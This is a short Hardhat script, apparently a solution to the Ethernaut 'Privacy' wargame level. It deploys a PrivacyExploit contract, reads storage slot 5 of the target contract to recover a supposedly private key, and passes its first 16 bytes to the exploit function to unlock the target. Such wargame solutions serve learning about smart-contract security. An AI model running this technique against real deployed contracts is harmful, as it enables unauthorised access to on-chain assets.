import { ethers } from "hardhat";

async function main() {
  const [exploiter] = await ethers.getSigners();
  const privacyAddress = "0x0d8A19EDd2f8DD94E3fB2d436392d4D776AB8bc4";

  const _privacyExploit = await ethers.getContractFactory("PrivacyExploit");
  const PrivacyExploit = await _privacyExploit
    .connect(exploiter)
    .deploy(privacyAddress);
  await PrivacyExploit.deployed();

  const dataAtIndex2 = await ethers.provider.getStorageAt(privacyAddress, 5);

  const byteSize = 16;
  const bytesPadding = `0x`;
  const tx = await PrivacyExploit.exploit(
    dataAtIndex2.substring(0, byteSize * 2 + bytesPadding.length)
  );
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
